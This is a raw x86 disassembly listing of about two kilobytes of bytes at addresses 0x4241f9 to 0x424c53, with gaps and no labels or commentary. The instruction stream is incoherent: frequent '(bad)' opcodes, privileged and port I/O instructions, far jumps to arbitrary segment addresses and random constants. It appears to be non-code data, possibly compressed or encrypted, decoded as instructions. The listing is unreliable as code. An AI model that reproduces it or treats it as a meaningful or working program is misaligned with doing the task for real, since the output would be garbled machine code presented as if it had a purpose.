  4241f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241fa:	push   ebx
  4241fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241fc:	jp     0x4241f9
  4241fe:	mov    al,0xf5
  424200:	aad    0xa3
  424202:	test   ebp,esp
  424204:	add    DWORD PTR [edi],esp
  424206:	(bad)  
  424207:	mov    bl,bl
  424209:	rcl    BYTE PTR [edx],cl
  42420b:	pop    esi
  42420c:	call   0x5368c3
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	or     eax,0x90e17a68
  424285:	add    DWORD PTR [ecx],0x10400
  42428b:	add    bh,ch
  42428d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42428e:	inc    edx
  42428f:	or     BYTE PTR [ebx+0x71756648],bh
  424295:	icebp  
  424296:	(bad)  
  424297:	shr    DWORD PTR [edx],1
  424299:	in     eax,dx
  42429a:	hlt    
  42429b:	sbb    al,0xd
  42429d:	push   esp
  42429e:	fisttp WORD PTR [edx+0x7]
  4242a1:	cmp    esp,0xffffffa4
  4242a4:	call   0xe930:0xa71aec3a
  4242ab:	out    0x81,eax
  4242ad:	pop    edi
  4242ae:	aam    0xa
  4242b0:	mov    ecx,cs
  4242b2:	xor    eax,0x546f7db3
  4242b7:	and    BYTE PTR [esi],ch
  4242b9:	clc    
  4242ba:	mov    ebp,0x4bf234a7
  4242bf:	xchg   esi,eax
  4242c0:	jmp    0xaca:0x5599500b
  4242c7:	sbb    al,0x16
  4242c9:	inc    edi
  4242ca:	in     al,dx
  4242cb:	in     al,dx
  4242cc:	and    eax,0xfd9f9e1b
  4242d1:	out    dx,al
  4242d2:	ds gs add eax,ecx
  4242d6:	add    dh,dh
  4242d8:	shr    BYTE PTR [ecx+0x17],cl
  4242db:	hlt    
  4242dc:	(bad)  
  4242dd:	ds cld 
  4242df:	mov    edi,0x807d5830
  4242e4:	nop
  4242e5:	out    dx,eax
  4242e6:	pop    esi
  4242e7:	pushf  
  4242e8:	xor    cl,bh
  4242ea:	cmp    esp,DWORD PTR [ebx]
  4242ec:	out    dx,eax
  4242ed:	(bad)  
  4242ee:	ss js  0x42431a
  4242f1:	adc    BYTE PTR [eax+0x14b65cda],dh
  4242f7:	jo     0x424304
  4242f9:	scas   eax,DWORD PTR es:[edi]
  4242fa:	or     DWORD PTR [ecx],ebp
  4242fc:	popa   
  4242fd:	xchg   BYTE PTR [edx],ah
  4242ff:	fbstp  TBYTE PTR [ebp-0x58]
  424302:	scas   eax,DWORD PTR es:[edi]
  424303:	nop
  424304:	dec    ebp
  424305:	or     eax,0x66e5154c
  42430a:	aaa    
  42430b:	pushf  
  42430c:	sbb    BYTE PTR [ebx+0x6d],al
  42430f:	ret    0xecb2
  424312:	mov    WORD PTR [esp+eax*1-0x1d0d336d],ds
  424319:	ret    
  42431a:	ret    0x5440
  42431d:	cmc    
  42431e:	repz push eax
  424320:	dec    ebp
  424321:	adc    BYTE PTR [esi],al
  424323:	dec    edi
  424324:	xchg   edx,eax
  424325:	jl     0x424347
  424327:	lahf   
  424328:	sbb    ecx,DWORD PTR [ecx]
  42432a:	pushf  
  42432b:	cmp    BYTE PTR [eax-0x7b],0x4a
  42432f:	dec    edx
  424330:	and    al,0xa5
  424332:	fld    QWORD PTR [ecx+0x75]
  424335:	add    DWORD PTR [ebx+0x5],ecx
  424338:	adc    cl,ah
  42433a:	sahf   
  42433b:	cmp    ebx,esp
  42433d:	shl    BYTE PTR [eax],1
  42433f:	mov    ebx,0xc2b82471
  424344:	mov    dl,0x87
  424346:	dec    ebx
  424347:	fimul  DWORD PTR [edi]
  424349:	inc    eax
  42434a:	sbb    bl,BYTE PTR [edx+0x4f6cfe7e]
  424350:	sbb    dh,BYTE PTR es:[ebp+edx*4-0x61]
  424355:	pop    ebx
  424356:	adc    esi,DWORD PTR [ebx-0x3d3143d]
  42435c:	cmp    al,0x73
  42435e:	mov    al,ds:0xfb92c021
  424363:	mov    al,ds:0xa0234b58
  424368:	retw   0x6837
  42436c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42436d:	mov    al,0x29
  42436f:	add    BYTE PTR [esi+0x2a570b32],ch
  424375:	inc    ecx
  424376:	xor    al,0x2f
  424378:	aas    
  424379:	sub    BYTE PTR [eax-0x3c],al
  42437c:	push   cs
  42437d:	call   0x3b42:0xd195501f
  424384:	in     al,0xcd
  424386:	adc    BYTE PTR [ebx],0x67
  424389:	enter  0x72ab,0x9
  42438d:	pop    ebp
  42438e:	fwait
  42438f:	call   0x424394
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424425
  424401:	cmp    eax,0x8294df06
  424406:	add    DWORD PTR [eax],eax
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	push   eax
  42440d:	sub    cl,BYTE PTR [eax+ebp*4-0x18d836b8]
  424414:	test   esp,ebp
  424416:	pop    ebp
  424417:	or     BYTE PTR [edi+edx*4],0x2d
  42441b:	push   esp
  42441c:	pop    ecx
  42441d:	push   ebp
  42441e:	mov    DWORD PTR ds:0x675a4132,ebx
  424424:	cmc    
  424425:	xchg   esp,eax
  424426:	dec    ecx
  424427:	sub    al,0xeb
  424429:	fdiv   DWORD PTR [edi+0x77f57c83]
  42442f:	adc    DWORD PTR [edi+0x32],esp
  424432:	or     dh,BYTE PTR [ecx+ebx*2+0x1c]
  424436:	jne    0x424488
  424438:	jp     0x42441c
  42443a:	mov    ebp,0x725eefde
  42443f:	mov    edi,0xc0f5b1db
  424444:	ins    DWORD PTR es:[edi],dx
  424445:	inc    edi
  424446:	jmp    0x4243fc
  424448:	jp     0x424471
  42444a:	aaa    
  42444b:	xchg   DWORD PTR [esi+0x52],edx
  42444e:	ret    
  42444f:	dec    edx
  424450:	inc    esp
  424451:	add    edi,DWORD PTR [ecx]
  424453:	addr16 dec ecx
  424455:	mov    eax,0x5d9e427e
  42445a:	dec    edi
  42445b:	jmp    0x4244a1
  42445d:	cdq    
  42445e:	outs   dx,BYTE PTR ds:[esi]
  42445f:	and    edi,ebp
  424461:	and    BYTE PTR [edi],bl
  424463:	mov    cl,ch
  424465:	test   DWORD PTR [eax+0x5a],ebp
  424468:	add    esp,DWORD PTR [esi]
  42446a:	inc    ebp
  42446b:	xchg   BYTE PTR [ecx+eiz*2],ah
  42446e:	sub    al,0xe6
  424470:	add    DWORD PTR [ecx],ebp
  424472:	shl    bh,cl
  424474:	xor    BYTE PTR [edi-0x65768004],dh
  42447a:	push   es
  42447b:	pop    ds
  42447c:	sbb    al,0x30
  42447e:	lods   eax,DWORD PTR ds:[esi]
  42447f:	repz sahf 
  424481:	out    dx,al
  424482:	addr16 xchg ecx,eax
  424484:	retf   0x32db
  424487:	push   eax
  424488:	jae    0x4244f0
  42448a:	mov    ecx,?
  42448c:	test   BYTE PTR [edx],bh
  42448e:	sti    
  42448f:	mov    WORD PTR [edi-0x7],fs
  424492:	xor    DWORD PTR [ebx-0x4d2073e],esp
  424498:	test   eax,0xda33944f
  42449d:	test   al,0x2a
  42449f:	hlt    
  4244a0:	mov    edx,gs
  4244a2:	jmp    0xd1e89ade
  4244a7:	int    0xa5
  4244a9:	mov    al,ds:0xe69d462c
  4244ae:	es cld 
  4244b0:	adc    al,0xc2
  4244b2:	test   al,0xe5
  4244b4:	packuswb mm1,QWORD PTR [eax+0x2]
  4244b8:	jmp    0x42448e
  4244ba:	(bad)  
  4244bb:	into   
  4244bc:	mov    ds,WORD PTR [edi+0x47]
  4244bf:	jnp    0x42449b
  4244c1:	aad    0xb5
  4244c3:	repz std 
  4244c5:	mov    edx,0x65b4f641
  4244ca:	dec    ebx
  4244cb:	ret    0x772a
  4244ce:	inc    ecx
  4244cf:	push   ecx
  4244d0:	scas   eax,DWORD PTR es:[edi]
  4244d1:	xchg   ebx,eax
  4244d2:	and    eax,esi
  4244d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244d5:	mov    esp,0x62e39af2
  4244da:	test   eax,0x5509dbfc
  4244df:	push   eax
  4244e0:	pop    edx
  4244e1:	fwait
  4244e2:	mov    ds:0x2286a428,al
  4244e7:	or     dh,BYTE PTR [eax+0x7a]
  4244ea:	jge    0x4244ce
  4244ec:	retf   0x4cac
  4244ef:	push   cs
  4244f0:	stos   DWORD PTR es:[di],eax
  4244f2:	bound  edi,QWORD PTR [esi+0x7e3bc218]
  4244f8:	add    eax,0x926ffa54
  4244fd:	mov    ah,ch
  4244ff:	jmp    0x7c7c095
  424504:	and    eax,0xd7ba8ffa
  424509:	iret   
  42450a:	je     0x424504
  42450c:	push   cs
  42450d:	dec    edx
  42450e:	mov    dh,0x24
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x7],1
  424581:	lock jmp 0x1c5de16
  424587:	add    BYTE PTR [ecx+eax*1],al
  42458a:	add    BYTE PTR [eax],al
  42458c:	dec    ah
  42458e:	mov    al,0x59
  424590:	adc    edx,DWORD PTR [ecx+0x2592da4c]
  424596:	mov    esp,0xd45cd768
  42459b:	cmp    esi,ebx
  42459d:	push   esi
  42459e:	sbb    edi,DWORD PTR fs:[eax+0x29d18a8c]
  4245a5:	xor    BYTE PTR [ecx+eiz*4-0x14],ch
  4245a9:	dec    ebp
  4245aa:	not    DWORD PTR [ebp-0x5495e3fd]
  4245b0:	gs pop ss
  4245b2:	(bad)  [esi-0xa242065]
  4245b8:	mov    al,ds:0x9a6680fc
  4245bd:	aad    0xac
  4245bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245c0:	pop    ebp
  4245c1:	inc    esi
  4245c2:	in     eax,0x21
  4245c4:	mov    dh,0x87
  4245c6:	xor    al,BYTE PTR [ebp-0x5f1c77d1]
  4245cc:	stos   BYTE PTR es:[edi],al
  4245cd:	xchg   edx,eax
  4245ce:	add    eax,0x7bd58aba
  4245d3:	(bad)  
  4245d5:	inc    esp
  4245d6:	lods   eax,DWORD PTR ds:[esi]
  4245d7:	pop    edi
  4245d8:	popf   
  4245d9:	in     eax,0x50
  4245db:	push   ecx
  4245dc:	mov    ah,0x4
  4245de:	sar    DWORD PTR [ebp+0x410d09a5],1
  4245e4:	retf   
  4245e5:	daa    
  4245e6:	inc    edx
  4245e7:	bound  edx,QWORD PTR [ebp-0x71]
  4245ea:	jne    0x4245cf
  4245ec:	jle    0x4245b2
  4245ee:	sbb    edi,DWORD PTR [esi-0x2702ec4f]
  4245f4:	jle    0x424651
  4245f6:	das    
  4245f7:	in     eax,dx
  4245f8:	nop
  4245f9:	sub    al,BYTE PTR [esi+ebp*4+0x4b]
  4245fd:	outs   dx,DWORD PTR ds:[esi]
  4245fe:	jle    0x4245da
  424600:	shr    BYTE PTR [esi],1
  424602:	mov    ecx,0x5b220840
  424607:	adc    ecx,DWORD PTR [ebx+0x6f641810]
  42460d:	das    
  42460e:	xchg   edx,eax
  42460f:	pop    eax
  424610:	gs fs fwait
  424613:	lods   eax,DWORD PTR ds:[esi]
  424614:	xchg   ebp,eax
  424615:	cmp    al,0x5a
  424617:	or     DWORD PTR [ebp-0x7c],ecx
  42461a:	pop    esp
  42461b:	(bad)  
  42461c:	lods   al,BYTE PTR ds:[esi]
  42461d:	call   0xa3c3:0x47b22d46
  424624:	add    ebx,DWORD PTR [ecx+0x5aac5cf]
  42462a:	xchg   esi,eax
  42462b:	imul   BYTE PTR [ebp-0x49]
  42462e:	pop    esp
  42462f:	or     eax,0x8195ce7f
  424634:	test   DWORD PTR [ebx],eax
  424636:	mov    bh,0x42
  424638:	jmp    0x78d1:0xaa8ce351
  42463f:	gs sub al,0x1c
  424642:	add    al,0xd8
  424644:	or     ebx,edx
  424646:	aas    
  424647:	ins    BYTE PTR es:[edi],dx
  424648:	mov    cl,0xc2
  42464a:	sub    DWORD PTR [edx+0x7c],eax
  42464d:	mov    ds:0x2324cd5b,al
  424652:	add    eax,0xec2188fd
  424657:	push   ecx
  424658:	fsub   QWORD PTR [edi+0x4789b58]
  42465e:	das    
  42465f:	out    dx,al
  424660:	dec    eax
  424661:	mov    ch,0x5a
  424663:	(bad)  
  424665:	cmp    eax,0xc43d7f17
  42466a:	scas   eax,DWORD PTR es:[edi]
  42466b:	add    dh,BYTE PTR [esi-0xa]
  42466e:	push   eax
  42466f:	iret   
  424670:	dec    eax
  424671:	je     0x4246bf
  424673:	retf   
  424674:	in     eax,dx
  424675:	jmp    0xee532fa4
  42467a:	int3   
  42467b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42467d:	add    al,0xa1
  42467f:	cdq    
  424680:	inc    ebp
  424681:	add    DWORD PTR [edi],esp
  424683:	test   DWORD PTR gs:[ebx+0x7c],0x41a57526
  42468b:	pusha  
  42468c:	inc    edx
  42468d:	or     DWORD PTR [ebx+0x4d],eax
	...
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [ebx+0x65],dh
  424702:	(bad)  
  424703:	test   eax,0x1849c
  424708:	add    al,0x1
  42470a:	add    BYTE PTR [eax],al
  42470c:	pushf  
  42470d:	or     eax,0xd1b5ebe3
  424712:	mov    bl,0x5f
  424714:	into   
  424715:	inc    ebx
  424716:	out    dx,eax
  424717:	jle    0x4246af
  424719:	jecxz  0x4246bd
  42471b:	nop
  42471c:	into   
  42471d:	pop    ss
  42471e:	les    esp,FWORD PTR [ecx+0x573cd8d2]
  424724:	repz or BYTE PTR [esi+eax*1+0x7fdca40a],cl
  42472c:	test   eax,0xd31959b8
  424731:	dec    edi
  424732:	cdq    
  424733:	ja     0x4246f9
  424735:	push   edx
  424736:	and    eax,0x1a6aacbf
  42473b:	inc    esi
  42473c:	jbe    0x4246c3
  42473e:	nop
  42473f:	and    dl,BYTE PTR [ecx+ebx*8]
  424742:	dec    esi
  424743:	pop    ecx
  424744:	jmp    0xfd285ef7
  424749:	out    dx,eax
  42474a:	jb     0x42477e
  42474c:	fidiv  DWORD PTR [eax+ebp*1+0x23e7a7a1]
  424753:	fisttp QWORD PTR [edx-0x34]
  424756:	in     eax,dx
  424757:	push   es
  424758:	and    ebp,eax
  42475a:	imul   edx,DWORD PTR [esi-0x30],0xea4c175e
  424761:	sahf   
  424762:	add    eax,0xc436c944
  424767:	sub    ebp,DWORD PTR [edi-0x44]
  42476a:	xchg   edx,eax
  42476b:	out    dx,al
  42476c:	push   0x61b13789
  424771:	ins    BYTE PTR es:[edi],dx
  424772:	jb     0x4247d8
  424774:	aad    0xa0
  424776:	shr    BYTE PTR [ecx+0x67],1
  424779:	imul   esp,DWORD PTR [edi+0x3],0xc012f0e8
  424780:	sub    al,BYTE PTR [edx+0x5b]
  424783:	xor    dl,BYTE PTR [esi-0x6cb80c67]
  424789:	sbb    eax,0xcae1070a
  42478e:	pop    ebx
  42478f:	scas   al,BYTE PTR es:[edi]
  424790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424791:	int3   
  424792:	ret    0xad8d
  424795:	or     eax,0x8a954108
  42479a:	scas   al,BYTE PTR es:[edi]
  42479b:	or     eax,0xc2a0ffeb
  4247a0:	ss jmp 0x424821
  4247a3:	pop    ebx
  4247a4:	cwde   
  4247a5:	xchg   DWORD PTR [eax-0x6d676960],ebp
  4247ab:	sahf   
  4247ac:	push   eax
  4247ad:	adc    DWORD PTR [esi+0x63],0x74
  4247b1:	jno    0x424771
  4247b3:	stos   BYTE PTR es:[edi],al
  4247b4:	xchg   ecx,eax
  4247b5:	pushf  
  4247b6:	mov    ax,ds:0x3e9a5ec6
  4247bc:	ss jae 0x4247f1
  4247bf:	and    eax,0x38c4503c
  4247c4:	pop    esi
  4247c5:	fnstenv [ebp+0x7e5a230]
  4247cb:	inc    edx
  4247cc:	(bad)  
  4247ce:	push   esi
  4247cf:	xchg   ebx,eax
  4247d0:	jl     0x42480b
  4247d2:	pop    esi
  4247d3:	jb     0x4247ec
  4247d5:	adc    DWORD PTR [edi-0x2c40b22a],edi
  4247db:	pop    ecx
  4247dc:	scas   eax,DWORD PTR es:[edi]
  4247dd:	leave  
  4247de:	cwde   
  4247df:	push   ds
  4247e0:	ja     0x424777
  4247e2:	test   ecx,ebp
  4247e4:	in     al,dx
  4247e5:	stc    
  4247e6:	mov    DWORD PTR ds:0x54cc45d6,eax
  4247ec:	xor    eax,DWORD PTR [ebp-0x19]
  4247ef:	rol    esp,0xce
  4247f2:	dec    esi
  4247f3:	cmp    eax,0x1c374319
  4247f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247f9:	loopne 0x424870
  4247fb:	mov    dl,0xae
  4247fd:	cwde   
  4247fe:	fptan  
  424800:	nop
  424801:	(bad)  
  424802:	out    dx,al
  424803:	out    0x8d,eax
  424805:	ins    DWORD PTR es:[edi],dx
  424806:	je     0x4247bc
  424808:	sbb    ecx,DWORD PTR [ebx-0x56a3c7da]
  42480e:	ret    
  42480f:	fwait
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	imul   esp,ebx,0x6a
  424883:	pushf  
  424884:	mov    al,ds:0x4000185
  424889:	add    DWORD PTR [eax],eax
  42488b:	add    BYTE PTR [ebp+0x7e],ah
  42488e:	or     al,0x9f
  424890:	pop    ss
  424891:	or     BYTE PTR [edi],0x6b
  424894:	inc    ebp
  424895:	das    
  424896:	mov    esi,0xd31f96aa
  42489b:	inc    esp
  42489c:	pop    ds
  42489d:	xor    DWORD PTR [edi+0x73],ecx
  4248a0:	cmp    eax,0xe65fcbd6
  4248a5:	mov    ah,0x19
  4248a7:	out    0x85,eax
  4248a9:	std    
  4248aa:	aas    
  4248ab:	add    DWORD PTR [edx-0x11],ecx
  4248ae:	ja     0x42488f
  4248b0:	sub    eax,0xcb8ada09
  4248b5:	outs   dx,BYTE PTR ds:[esi]
  4248b6:	mov    eax,0x4c16bf18
  4248bb:	popf   
  4248bc:	push   ds
  4248bd:	dec    esp
  4248be:	jge    0x4248c5
  4248c0:	mov    eax,ds:0x8976ca37
  4248c5:	push   cs
  4248c6:	out    dx,eax
  4248c7:	and    ebp,ebp
  4248c9:	sbb    DWORD PTR [ecx-0x634cd4c],ecx
  4248cf:	xor    al,cl
  4248d1:	xor    BYTE PTR [ecx],ah
  4248d3:	and    ebp,DWORD PTR [eax+0x24661dbd]
  4248d9:	and    al,0xf6
  4248db:	push   DWORD PTR [esi+0x11]
  4248de:	mov    WORD PTR [ebp+edx*2+0x26],?
  4248e2:	push   ecx
  4248e3:	add    DWORD PTR [eax-0x25],esp
  4248e6:	push   es
  4248e7:	ss pop ebx
  4248e9:	dec    esi
  4248ea:	cli    
  4248eb:	xchg   esp,eax
  4248ec:	mov    eax,0xcc3d3297
  4248f1:	cwde   
  4248f2:	pop    eax
  4248f3:	outs   dx,DWORD PTR ds:[esi]
  4248f4:	add    bh,BYTE PTR [eax+0x635a3868]
  4248fa:	lock pop ss
  4248fc:	loopne 0x4248cb
  4248fe:	cmp    esi,esi
  424900:	adc    ebx,DWORD PTR [esi]
  424902:	fcmovbe st,st(1)
  424904:	ins    BYTE PTR es:[edi],dx
  424905:	push   ecx
  424906:	mov    edx,0xa1c1e2fa
  42490b:	test   al,0x92
  42490d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42490e:	sbb    eax,0x2b72c51d
  424913:	xchg   edi,eax
  424914:	mov    esp,0xb53f9703
  424919:	adc    al,0x81
  42491b:	in     eax,dx
  42491c:	mov    ch,0xf5
  42491e:	mov    esp,0x99b04c1d
  424923:	lods   al,BYTE PTR ds:[esi]
  424924:	xor    BYTE PTR [edi-0x7b],ah
  424927:	xor    BYTE PTR [eax],bh
  424929:	cmp    al,0x5
  42492b:	pusha  
  42492c:	rcl    BYTE PTR [ecx],0xb0
  42492f:	xchg   ebx,eax
  424930:	xchg   edx,eax
  424931:	mov    ebp,0xe37c06ab
  424936:	lods   eax,DWORD PTR ds:[esi]
  424937:	daa    
  424938:	ja     0x42494a
  42493a:	aaa    
  42493b:	mov    ds:0xfb6d52b8,eax
  424940:	inc    ebp
  424941:	pop    esp
  424942:	and    esp,ecx
  424944:	add    al,0x83
  424946:	fcomp  QWORD PTR [ecx+0x76b93746]
  42494c:	(bad)  
  42494d:	adc    DWORD PTR [eax],ebp
  42494f:	xor    BYTE PTR ds:0xf472fae0,dh
  424955:	cmc    
  424956:	inc    ecx
  424957:	xlat   BYTE PTR ds:[ebx]
  424958:	mov    eax,0xd2ded140
  42495d:	data16 arpl WORD PTR [eax],cx
  424960:	push   es
  424961:	cwde   
  424962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424963:	mov    dl,0x88
  424965:	or     BYTE PTR [ebx],0x35
  424968:	fwait
  424969:	shl    BYTE PTR [ebp+0x531a153e],cl
  42496f:	test   DWORD PTR [edx-0x7d0e4d6f],ecx
  424975:	jne    0x424911
  424977:	inc    esi
  424978:	daa    
  424979:	daa    
  42497a:	ss push es
  42497c:	(bad)
  42497f:	inc    edx
  424980:	adc    DWORD PTR [eax-0x30],0x7914781a
  424987:	pusha  
  424988:	rol    BYTE PTR [eax],cl
  42498a:	bndstx [eax+ecx*8+0xe189],(bad)
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    al,BYTE PTR [ecx-0x5b7c9ac6]
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	mov    eax,ds:0x5d77cf6c
  424a11:	fldcw  WORD PTR [esi]
  424a13:	loope  0x424a8f
  424a15:	fsubrp st(2),st
  424a17:	repnz sahf 
  424a19:	fs in  al,dx
  424a1b:	adc    BYTE PTR [ecx],ch
  424a1d:	fst    QWORD PTR [edx-0x45]
  424a20:	icebp  
  424a21:	loope  0x424a3b
  424a23:	mov    eax,0x315dcef5
  424a28:	je     0x4249f0
  424a2a:	stc    
  424a2b:	xor    eax,0x23f2d339
  424a30:	in     eax,dx
  424a31:	inc    eax
  424a32:	lods   eax,DWORD PTR ds:[esi]
  424a33:	or     DWORD PTR [edx+eiz*1],ebx
  424a36:	(bad)  
  424a37:	jne    0x424a24
  424a39:	pop    ecx
  424a3a:	mov    ds:0xfcf8abc1,eax
  424a3f:	xchg   ebx,eax
  424a40:	hlt    
  424a41:	or     eax,0x217e4074
  424a46:	push   ebp
  424a47:	and    BYTE PTR [eax-0x2c4ae9f7],bh
  424a4d:	and    DWORD PTR [edx],edx
  424a4f:	dec    edi
  424a50:	push   esp
  424a51:	push   0x8a3710e5
  424a56:	mov    ebp,0x698eb66c
  424a5b:	(bad)  
  424a5c:	pop    ds
  424a5d:	aad    0x66
  424a5f:	(bad)  
  424a60:	cli    
  424a61:	enter  0x7c46,0x9
  424a65:	icebp  
  424a66:	jne    0x424a0a
  424a68:	into   
  424a69:	int3   
  424a6a:	fs push edx
  424a6c:	dec    ebx
  424a6d:	pop    ecx
  424a6e:	mov    eax,0xd064792c
  424a73:	fistp  DWORD PTR [ecx-0x1f]
  424a76:	stos   DWORD PTR es:[edi],eax
  424a77:	cwde   
  424a78:	(bad)  
  424a7a:	aad    0x5a
  424a7c:	push   fs
  424a7e:	scas   al,BYTE PTR es:[edi]
  424a7f:	arpl   WORD PTR [eax-0x1773a98c],cx
  424a85:	adc    ecx,ebp
  424a87:	shr    DWORD PTR [esi+0x74b8f907],cl
  424a8d:	xchg   edx,eax
  424a8e:	test   DWORD PTR gs:[esi+0x58],0x61684f43
  424a96:	jle    0x424b10
  424a98:	outs   dx,BYTE PTR ds:[esi]
  424a99:	jle    0x424a2e
  424a9b:	or     DWORD PTR [ebx-0x3183436e],0xdb917530
  424aa5:	dec    edx
  424aa6:	jle    0x424b10
  424aa8:	push   ebp
  424aa9:	cmc    
  424aaa:	movhps xmm5,QWORD PTR [ebp+ebp*4-0xe]
  424aaf:	in     eax,dx
  424ab0:	jmp    0xfa97782
  424ab5:	jl     0x424a6d
  424ab7:	jp     0x424a96
  424ab9:	pop    ecx
  424aba:	or     cl,bl
  424abc:	dec    eax
  424abe:	ins    BYTE PTR es:[edi],dx
  424abf:	jns    0x424aad
  424ac1:	jmp    0x147a:0xc545ce5b
  424ac8:	jno    0x424a8a
  424aca:	shl    esi,cl
  424acc:	adc    al,0x0
  424ace:	dec    al
  424ad0:	mov    esi,0xe1a55fdf
  424ad5:	pop    edi
  424ad6:	inc    ecx
  424ad7:	(bad)  
  424ad9:	repz fidivr WORD PTR [esi+0x72763b7b]
  424ae0:	clc    
  424ae1:	dec    esi
  424ae2:	test   al,0x2d
  424ae4:	cmp    ah,dh
  424ae6:	xchg   esp,eax
  424ae7:	aaa    
  424ae8:	add    BYTE PTR [ecx+0x71],dl
  424aeb:	add    eax,0x7126dac5
  424af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424af1:	mov    edx,0xfc6f10ef
  424af6:	mov    al,0x9b
  424af8:	mov    al,ds:0x324462af
  424afd:	push   esi
  424afe:	call   0x5f4e:0x62503345
  424b05:	pop    esp
  424b06:	and    ah,bl
  424b08:	push   0x7d
  424b0a:	xchg   edx,eax
  424b0b:	outs   dx,BYTE PTR ds:[esi]
  424b0c:	adc    eax,0x829445
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	mov    ecx,0xa8f4976c
  424b85:	xchg   DWORD PTR [ecx],eax
  424b87:	add    BYTE PTR [ecx+eax*1],al
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	adc    bh,BYTE PTR [edx+0x60]
  424b8f:	mov    dl,0xf7
  424b91:	mov    esi,0xd57b855a
  424b96:	pop    ebp
  424b97:	pop    ebx
  424b98:	popf   
  424b99:	or     esp,DWORD PTR [edx+0x1af5f1a5]
  424b9f:	stc    
  424ba0:	in     eax,dx
  424ba1:	mov    dh,0xa3
  424ba3:	sar    BYTE PTR [eax+0x2],cl
  424ba6:	xor    eax,0xfd7edc7f
  424bab:	popf   
  424bac:	adc    al,0x6a
  424bae:	and    BYTE PTR [eax+0x35b0e7ae],bh
  424bb4:	inc    ebp
  424bb5:	je     0x424b8c
  424bb7:	into   
  424bb8:	sbb    ebx,DWORD PTR [ebx+0x35de7962]
  424bbe:	mov    BYTE PTR [esi+ebp*2],bl
  424bc1:	cld    
  424bc2:	outs   dx,DWORD PTR ds:[esi]
  424bc3:	out    dx,al
  424bc4:	bswap  ebx
  424bc6:	out    dx,eax
  424bc7:	(bad)  
  424bc8:	lock cdq 
  424bca:	mov    DWORD PTR [edx+0x79d2b7],esi
  424bd0:	fist   WORD PTR [edx+0x7a]
  424bd3:	test   eax,0xb2281bd0
  424bd8:	cmp    esp,ebp
  424bda:	ror    DWORD PTR [ebp+eax*8-0x289c97f9],0xa5
  424be2:	lods   al,BYTE PTR ds:[esi]
  424be3:	xor    eax,ecx
  424be5:	aas    
  424be6:	mov    ebx,0xfeb49d52
  424beb:	outs   dx,BYTE PTR fs:[esi]
  424bed:	fs stos BYTE PTR es:[edi],al
  424bef:	call   0x5b55:0x2236eace
  424bf6:	scas   al,BYTE PTR es:[edi]
  424bf7:	pop    esi
  424bf8:	pop    esp
  424bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bfa:	sahf   
  424bfb:	pusha  
  424bfc:	and    ebx,edx
  424bfe:	add    eax,DWORD PTR [esi-0x5fd3685]
  424c04:	cs or  eax,0x5dda1b5d
  424c0a:	cli    
  424c0b:	xor    ebx,DWORD PTR [ecx]
  424c0d:	mov    DWORD PTR [edi+0x73bc2545],edi
  424c13:	cmp    edx,ebx
  424c15:	into   
  424c16:	imul   edi,DWORD PTR [eax],0x27
  424c19:	stos   DWORD PTR es:[edi],eax
  424c1a:	sub    BYTE PTR [ecx-0x3941741c],dl
  424c20:	xor    DWORD PTR [ecx],edi
  424c22:	ficom  DWORD PTR [ebp-0x4d]
  424c25:	mov    eax,ds:0x76c7fb4f
  424c2a:	scas   eax,DWORD PTR es:[edi]
  424c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c2c:	sub    al,0x49
  424c2e:	mov    dl,0xf5
  424c30:	stos   DWORD PTR es:[edi],eax
  424c31:	pop    eax
  424c32:	and    eax,0xad118fee
  424c37:	mov    cl,0xd0
  424c39:	inc    edi
  424c3a:	fcomp  st(5)
  424c3c:	sub    bh,al
  424c3e:	fadd   QWORD PTR [bp+si]
  424c41:	or     dl,BYTE PTR [ebx-0xe1a5e5]
  424c47:	scas   al,BYTE PTR es:[edi]
  424c48:	sbb    eax,0xd9b41a86
  424c4d:	pop    es
  424c4e:	js     0x424c96
  424c50:	shr    BYTE PTR [edi+ebx*8],1
  424c53:	add    ah,BYTE PTR ds:[ecx]
